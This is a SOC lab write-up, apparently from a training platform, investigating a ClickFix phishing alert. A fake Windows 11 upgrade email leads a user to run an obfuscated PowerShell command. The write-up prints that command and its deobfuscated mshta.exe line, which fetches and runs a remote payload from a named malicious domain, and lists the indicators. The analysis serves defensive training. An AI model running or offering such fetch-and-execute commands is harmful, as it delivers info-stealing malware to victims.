# DLL Side-Loading via Click Fix Phishing

## **Introduction**

1. DLL side-loading via ClickFix phishing is a sophisticated, high-growth, social engineering attack method that emerged prominently in late 2024 and 2025. It combines the deception of "ClickFix" (or "Pastejacking") with the stealth of DLL side-loading to deliver malware like Lumma Stealer and PureRAT, primarily targeting Windows systems


## Alert Details

| Field | Details |
| --- | --- |
| **Investigation Type** | Data Leak Investigation |
| **Event ID** | 316 |
| **Event Time** | Mar 13, 2025, 09:44 AM |
| **Rule** | SOC338 - Lumma Stealer - DLL Side-Loading via Click Fix Phishing |
| **Level** | Security Analyst |
| **SMTP Address** | 132.232.40.201 |
| **Source Address** | [update@windows-update.site](mailto:update@windows-update.site) |
| **Destination Address** | [dylan@letsdefend.io](mailto:dylan@letsdefend.io) |
| **E-mail Subject** | Upgrade your system to Windows 11 Pro for FREE |
| **Device Action** | Allowed |
| **Trigger Reason** | Redirected site contains a click fix type script for Lumma Stealer distribution |

<img width="1537" height="322" alt="1" src="https://github.com/user-attachments/assets/9ba33613-6071-44d0-acab-91f6a0205a9f" />

## Threat Intelligence Analysis

On the threat intelligence analysis, the first impression was it to be a phishing link. The source address looks like this:

> update@windows-update.site
> 

Windows or microsoft doesn’t uses domains like this. For a record, I scanned it in virus total and it also marked it as malicious phishing link.

<img width="1501" height="751" alt="2" src="https://github.com/user-attachments/assets/d57bc7ec-49f1-48b6-b857-5c8615beabf6" />

## Email Security Investigation

When I investigated on the email I found some suspicious thing :

- Email domain looks suspicious - windows-update.site
- An offer saying upgrade for free - “Upgrade to Windows 11 Pro for FREE”
- Urgency -  Countdown timer: *4 Days 23 Hours*
- Multiple update buttons

Also microsoft never distributes upgrades via Email links.

<img width="1531" height="604" alt="3" src="https://github.com/user-attachments/assets/7cdf5f57-bc97-44b3-bab5-511eee5c909c" />

<img width="1513" height="610" alt="4" src="https://github.com/user-attachments/assets/917fac0f-3ca0-4566-81fa-f3415917ac80" />

## Log Analysis

Log analysis shows that an external SMTP server (132.232.40.201) sent an email to the internal mail server (172.16.20.3) on port 25. The sender address ([update@windows-update.site](mailto:update@windows-update.site)) uses a suspicious domain that impersonates Microsoft services. Based on the sender domain, phishing-style subject, and associated security alert for Lumma Stealer distribution, this activity is considered suspicious and likely part of a phishing campaign.

## Endpoint Security Analysis

When analyzed Browsing history shows that the user clicked on the link.

<img width="1089" height="141" alt="5" src="https://github.com/user-attachments/assets/7d44c5d0-b097-4818-834b-a6c2b56aa6bf" />

Also the terminal log looks suspicious 

Terminal log:

```bash
PowerShell.exe -w 1 powershell -Command('ms]]]ht]]]a]]].]]]exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4' -replace ']'
```

The command uses **string obfuscation**.

After removing `]` characters, it becomes:

```
mshta.exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4
```

This technique is used to **bypass security detection**.

This url also a malicious one marked by virustotal

<img width="1488" height="765" alt="6" src="https://github.com/user-attachments/assets/2c5c882f-aa4e-49d1-8a2d-a1ebb771bd13" />

The process mshta Execution is suspicious 

command: 

```bash
"C:\Windows\System32\mshta.exe"
https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4
```

`mshta.exe` is a **Living-Off-The-Land Binary (LOLBIN)** used by attackers.

It can execute - malicious scripts, remote payloads, malwares. Attackers often use payloads as media files.

<img width="1020" height="472" alt="7" src="https://github.com/user-attachments/assets/41ba6d01-2d58-4e72-bc18-2e5b80a79f04" />

## Indicators of Compromise (IOCs):

- Phishing Domain: windows-update.site
- Malicious Domain / C2: overcoatpassably.shop
- Malicious URL: https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4
- Suspicious Processes: powershell.exe, mshta.exe
- Obfuscated Command: PowerShell command executing mshta with a remote payload
- Suspicious Email Sender: [update@windows-update.site](mailto:update@windows-update.site)
- Source IP Address: 132.232.40.201

## Conclusion

This incident shows successful phishing leading to malware execution.

The user visited the phishing domain windows-update.site, which triggered a malicious PowerShell command. The command executed mshta.exe, which downloaded and executed a payload from overcoatpassably.shop, likely delivering Lumma Stealer malware.

The affected system has been contained from the network for prevent further communication with the malicious domain and c2 servers.
